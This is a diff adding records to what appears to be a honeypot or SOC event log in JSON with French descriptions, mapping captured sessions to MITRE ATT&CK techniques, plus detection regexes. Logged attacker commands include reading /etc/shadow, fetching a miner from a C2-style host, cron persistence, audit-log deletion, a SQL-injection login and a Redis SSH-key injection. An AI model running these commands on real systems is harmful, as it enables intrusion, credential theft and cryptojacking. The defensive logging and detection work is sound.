@@ -545,5 +545,3144 @@
         "desc": "Tentative de force brute ou connexion non autorisée sur service de base de données MySQL"
       }
     ]
+  },
+  {
+    "session_id": "shell-1794229703-48210",
+    "type": "shell",
+    "timestamp": "2026-11-09T13:08:23.687099+00:00",
+    "source_ip": "185.220.101.5",
+    "source_port": 48210,
+    "geo": {
+      "country": "Allemagne (Tor Exit Node)",
+      "country_code": "DE",
+      "city": "Frankfurt",
+      "isp": "Tor Anonymity Router",
+      "threat_level": "Tor"
+    },
+    "auth": {
+      "username": "root",
+      "password": "toor123"
+    },
+    "commands": [
+      {
+        "time": "14:08:23",
+        "command": "whoami",
+        "mitre": [
+          "T1033"
+        ]
+      },
+      {
+        "time": "14:08:24",
+        "command": "uname -a",
+        "mitre": [
+          "T1082"
+        ]
+      },
+      {
+        "time": "14:08:24",
+        "command": "cat /etc/passwd",
+        "mitre": [
+          "T1003"
+        ]
+      },
+      {
+        "time": "14:08:24",
+        "command": "cat /etc/shadow",
+        "mitre": [
+          "T1003"
+        ]
+      },
+      {
+        "time": "14:08:24",
+        "command": "wget http://c2-malware.darknet.ru/miner.sh",
+        "mitre": [
+          "T1105",
+          "T1059"
+        ]
+      },
+      {
+        "time": "14:08:24",
+        "command": "chmod +x miner.sh",
+        "mitre": [
+          "T1222",
+          "T1059"
+        ]
+      },
+      {
+        "time": "14:08:25",
+        "command": "crontab -e",
+        "mitre": [
+          "T1053"
+        ]
+      },
+      {
+        "time": "14:08:25",
+        "command": "rm -rf /var/log/audit.log",
+        "mitre": [
+          "T1070"
+        ]
+      }
+    ],
+    "mitre_alerts": [
+      {
+        "id": "T1033",
+        "name": "System Owner/User Discovery",
+        "tactic": "Discovery",
+        "pattern": "\\b(whoami\\b|id\\b|\\bw\\b|\\bwho\\b|last\\b|groups\\b)\\b",
+        "severity": "LOW",
+        "desc": "Identification des privilèges de la session courante et des utilisateurs connectés"
+      },
+      {
+        "id": "T1082",
+        "name": "System Information Discovery",
+        "tactic": "Discovery",
+        "pattern": "\\b(uname\\s+-[ar]|cat\\s+/etc/.*release|lscpu\\b|hostname\\b|uptime\\b|systeminfo\\b)\\b",
+        "severity": "MEDIUM",
+        "desc": "Reconnaissance de l'architecture, du noyau Linux et de la distribution hôte"
+      },
+      {
+        "id": "T1003",
+        "name": "OS Credential Dumping",
+        "tactic": "Credential Access",
+        "pattern": "(cat\\s+/etc/(passwd|shadow)|grep\\s+.*shadow|unshadow|mimikatz|id_rsa|\\.aws/credentials|\\.docker/config)",
+        "severity": "CRITICAL",
+        "desc": "Tentative d'extraction de comptes, clés privées ou hashs de mots de passe système"
+      },
+      {
+        "id": "T1003",
+        "name": "OS Credential Dumping",
+        "tactic": "Credential Access",
+        "pattern": "(cat\\s+/etc/(passwd|shadow)|grep\\s+.*shadow|unshadow|mimikatz|id_rsa|\\.aws/credentials|\\.docker/config)",
+        "severity": "CRITICAL",
+        "desc": "Tentative d'extraction de comptes, clés privées ou hashs de mots de passe système"
+      },
+      {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic": "Command and Control",
+        "pattern": "\\b(wget\\b|curl\\b|tftp\\b|ftpget\\b|fetch\\b|scp\\b|bitsadmin|certutil)\\b",
+        "severity": "HIGH",
+        "desc": "Téléchargement d'un payload externe, binaire malveillant ou script de minage"
+      },
+      {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "tactic": "Execution",
+        "pattern": "\\b(\\./[^\\s]+|bash\\b|sh\\b|python\\d*\\b|perl\\b|php\\b|powershell\\b)\\b",
+        "severity": "MEDIUM",
+        "desc": "Exécution d'un binaire suspect, script shell ou interpréteur de commandes"
+      },
+      {
+        "id": "T1222",
+        "name": "File Permissions Modification",
+        "tactic": "Defense Evasion",
+        "pattern": "\\b(chmod\\s+(\\+x|777|755)|chown\\b|attrib\\b)\\b",
+        "severity": "MEDIUM",
+        "desc": "Attribution des privilèges d'exécution sur un payload ou évasion de contrôles"
+      },
+      {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "tactic": "Execution",
+        "pattern": "\\b(\\./[^\\s]+|bash\\b|sh\\b|python\\d*\\b|perl\\b|php\\b|powershell\\b)\\b",
+        "severity": "MEDIUM",
+        "desc": "Exécution d'un binaire suspect, script shell ou interpréteur de commandes"
+      },
+      {
+        "id": "T1053",
+        "name": "Scheduled Task / Job (Cron Persistence)",
+        "tactic": "Persistence",
+        "pattern": "\\b(crontab\\b|/etc/cron|systemctl\\s+enable|schtasks\\b)\\b",
+        "severity": "HIGH",
+        "desc": "Tentative de persistance via tâche planifiée cron ou enregistrement de service"
+      },
+      {
+        "id": "T1070",
+        "name": "Indicator Removal on Host",
+        "tactic": "Defense Evasion",
+        "pattern": "\\b(history\\s+-c|rm\\s+.*\\.log|unset\\s+HISTFILE|killall\\s+-9)\\b",
+        "severity": "HIGH",
+        "desc": "Effacement de l'historique bash ou suppression de journaux d'audit pour masquer l'intrusion"
+      }
+    ]
+  },
+  {
+    "session_id": "web-1794229705",
+    "type": "web_attack",
+    "timestamp": "2026-11-09T13:08:25.514705+00:00",
+    "source_ip": "45.154.255.89",
+    "geo": {
+      "country": "Pays-Bas (Botnet Scanner)",
+      "country_code": "NL",
+      "city": "Amsterdam",
+      "isp": "Bulletproof Host",
+      "threat_level": "Malveillant"
+    },
+    "method": "GET",
+    "path": "/.env",
+    "body": "",
+    "mitre_alerts": [
+      {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application",
+        "tactic": "Initial Access",
+        "pattern": "(SELECT\\s+.*FROM|UNION\\s+SELECT|'\\s*OR\\s*'1'='1|\\.\\./|\\.env|\\.git/config|wp-config|phpmyadmin|actuator|/api/v1/debug)",
+        "severity": "CRITICAL",
+        "desc": "Injection SQL, Directory Traversal, ou sonde de fichiers de configuration sensibles"
+      }
+    ]
+  },
+  {
+    "session_id": "web-1794229705",
+    "type": "web_attack",
+    "timestamp": "2026-11-09T13:08:25.741680+00:00",
+    "source_ip": "45.154.255.89",
+    "geo": {
+      "country": "Pays-Bas (Botnet Scanner)",
+      "country_code": "NL",
+      "city": "Amsterdam",
+      "isp": "Bulletproof Host",
+      "threat_level": "Malveillant"
+    },
+    "method": "GET",
+    "path": "/wp-login.php",
+    "body": "",
+    "mitre_alerts": [
+      {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "tactic": "Execution",
+        "pattern": "\\b(\\./[^\\s]+|bash\\b|sh\\b|python\\d*\\b|perl\\b|php\\b|powershell\\b)\\b",
+        "severity": "MEDIUM",
+        "desc": "Exécution d'un binaire suspect, script shell ou interpréteur de commandes"
+      }
+    ]
+  },
+  {
+    "session_id": "web-1794229705",
+    "type": "web_attack",
+    "timestamp": "2026-11-09T13:08:25.971887+00:00",
+    "source_ip": "45.154.255.89",
+    "geo": {
+      "country": "Pays-Bas (Botnet Scanner)",
+      "country_code": "NL",
+      "city": "Amsterdam",
+      "isp": "Bulletproof Host",
+      "threat_level": "Malveillant"
+    },
+    "method": "POST",
+    "path": "/login",
+    "body": "username=admin' OR '1'='1&password=password",
+    "mitre_alerts": [
+      {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application",
+        "tactic": "Initial Access",
+        "pattern": "(SELECT\\s+.*FROM|UNION\\s+SELECT|'\\s*OR\\s*'1'='1|\\.\\./|\\.env|\\.git/config|wp-config|phpmyadmin|actuator|/api/v1/debug)",
+        "severity": "CRITICAL",
+        "desc": "Injection SQL, Directory Traversal, ou sonde de fichiers de configuration sensibles"
+      }
+    ]
+  },
+  {
+    "session_id": "redis-1794229706",
+    "type": "redis_exploit",
+    "timestamp": "2026-11-09T13:08:26.804751+00:00",
+    "source_ip": "194.26.29.112",
+    "geo": {
+      "country": "Russie",
+      "country_code": "RU",
+      "city": "Moscou",
+      "isp": "BadHost LLC",
+      "threat_level": "C2 Scanner"
+    },
+    "commands": [
+      {
+        "time": "14:08:26",
+        "command": "CONFIG SET dir /root/.ssh"
+      },
+      {
+        "time": "14:08:26",
+        "command": "CONFIG SET dbfilename authorized_keys"
+      },
+      {
+        "time": "14:08:26",
+        "command": "SET crackit \"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@darknet\\n\\n\""
+      },
+      {
+        "time": "14:08:26",
+        "command": "SAVE"
+      }
+    ],
+    "mitre_alerts": [
+      {
+        "id": "T1098",
+        "name": "Account Manipulation (SSH Key Injection)",
+        "tactic": "Persistence",
+        "pattern": "(authorized_keys|ssh-rsa|useradd\\b|usermod\\b|CONFIG\\s+SET\\s+dir\\s+/root/\\.ssh|CONFIG\\s+SET\\s+dbfilename)",
+        "severity": "CRITICAL",
+        "desc": "Injection de clés publiques SSH ou modification de comptes pour accès permanent"
+      },
+      {
+        "id": "T1098",
+        "name": "Account Manipulation (SSH Key Injection)",
+        "tactic": "Persistence",
+        "pattern": "(authorized_keys|ssh-rsa|useradd\\b|usermod\\b|CONFIG\\s+SET\\s+dir\\s+/root/\\.ssh|CONFIG\\s+SET\\s+dbfilename)",
+        "severity": "CRITICAL",
+        "desc": "Injection de clés publiques SSH ou modification de comptes pour accès permanent"
+      },
+      {
+        "id": "T1098",
+        "name": "Account Manipulation (SSH Key Injection)",
+        "tactic": "Persistence",
+        "pattern": "(authorized_keys|ssh-rsa|useradd\\b|usermod\\b|CONFIG\\s+SET\\s+dir\\s+/root/\\.ssh|CONFIG\\s+SET\\s+dbfilename)",
+        "severity": "CRITICAL",
+        "desc": "Injection de clés publiques SSH ou modification de comptes pour accès permanent"
+      }
+    ]
+  },
+  {
+    "session_id": "mysql-1794229706",
+    "type": "mysql_auth_attempt",
+    "timestamp": "2026-11-09T13:08:26.835073+00:00",
+    "source_ip": "198.51.100.44",
+    "geo": {
+      "country": "États-Unis",
+      "country_code": "US",
+      "city": "Ashburn",
+      "isp": "Cloud Provider",
+      "threat_level": "Scanner"
+    },
+    "auth": {
+      "username": "root"
+    },
+    "mitre_alerts": [
+      {
+        "id": "T1110",
+        "name": "Brute Force (Database)",
+        "tactic": "Credential Access",
+        "severity": "HIGH",
+        "desc": "Tentative de force brute ou connexion non autorisée sur service de base de données MySQL"
+      }
+    ]
+  },
+  {
+    "session_id": "web-get-1794233185-54769",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:06:25.443260+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/.env",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Microsoft Edge\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "Upgrade-Insecure-Requests": "1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36 Edg/157.0.0.0",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+      "Sec-Fetch-Site": "none",
+      "Sec-Fetch-Mode": "navigate",
+      "Sec-Fetch-User": "?1",
+      "Sec-Fetch-Dest": "document",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"
+    },
+    "mitre_alerts": [
+      {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application",
+        "tactic": "Initial Access",
+        "pattern": "(SELECT\\s+.*FROM|UNION\\s+SELECT|'\\s*OR\\s*'1'='1|\\.\\./|\\.env|\\.git/config|wp-config|phpmyadmin|actuator|/api/v1/debug)",
+        "severity": "CRITICAL",
+        "desc": "Injection SQL, Directory Traversal, ou sonde de fichiers de configuration sensibles"
+      }
+    ]
+  },
+  {
+    "session_id": "web-get-1794233185-59520",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:06:25.799454+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36 Edg/157.0.0.0",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Microsoft Edge\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/.env",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233288-49936",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:08:08.241201+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "Upgrade-Insecure-Requests": "1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+      "Sec-Fetch-Site": "none",
+      "Sec-Fetch-Mode": "navigate",
+      "Sec-Fetch-User": "?1",
+      "Sec-Fetch-Dest": "document",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233288-63151",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:08:08.315245+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "Upgrade-Insecure-Requests": "1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+      "Sec-Fetch-Site": "none",
+      "Sec-Fetch-Mode": "navigate",
+      "Sec-Fetch-User": "?1",
+      "Sec-Fetch-Dest": "document",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233288-54872",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:08:08.323787+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "Upgrade-Insecure-Requests": "1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+      "Sec-Fetch-Site": "none",
+      "Sec-Fetch-Mode": "navigate",
+      "Sec-Fetch-User": "?1",
+      "Sec-Fetch-Dest": "document",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233288-50064",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:08:08.426058+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233290-53664",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:08:10.160493+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Microsoft Edge\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "Upgrade-Insecure-Requests": "1",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36 Edg/157.0.0.0",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+      "Sec-Fetch-Site": "none",
+      "Sec-Fetch-Mode": "navigate",
+      "Sec-Fetch-User": "?1",
+      "Sec-Fetch-Dest": "document",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233290-57873",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:08:10.235262+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36 Edg/157.0.0.0",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Microsoft Edge\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-post-1794233326",
+    "type": "web_attack",
+    "timestamp": "2026-11-09T14:08:46.199454+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "POST",
+    "path": "/login",
+    "body": "username=admin&password=password123",
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233326-64441",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:08:46.243938+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36 Edg/157.0.0.0",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Microsoft Edge\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/login",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "shell-1794233389-64528",
+    "type": "shell",
+    "timestamp": "2026-11-09T14:09:49.562585+00:00",
+    "source_ip": "127.0.0.1",
+    "source_port": 64528,
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "auth": {
+      "username": "SSH-2.0-OpenSSH_for_Windows_9.5",
+      "password": "\u0000\u0000\u0005"
+    },
+    "commands": [],
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "redis-1794233428-59957",
+    "type": "redis_exploit",
+    "timestamp": "2026-11-09T14:10:28.417912+00:00",
+    "source_ip": "127.0.0.1",
+    "source_port": 59957,
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "commands": [
+      {
+        "time": "15:10:28",
+        "command": "CONFIG SET dir /root/.ssh"
+      }
+    ],
+    "mitre_alerts": [
+      {
+        "id": "T1098",
+        "name": "Account Manipulation (SSH Key Injection)",
+        "tactic": "Persistence",
+        "pattern": "(authorized_keys|ssh-rsa|useradd\\b|usermod\\b|CONFIG\\s+SET\\s+dir\\s+/root/\\.ssh|CONFIG\\s+SET\\s+dbfilename)",
+        "severity": "CRITICAL",
+        "desc": "Injection de clés publiques SSH ou modification de comptes pour accès permanent"
+      }
+    ]
+  },
+  {
+    "session_id": "web-get-1794233499-53910",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:11:39.296122+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233509-54175",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:11:49.334589+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233519-63288",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:11:59.370159+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233529-58889",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:12:09.422631+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
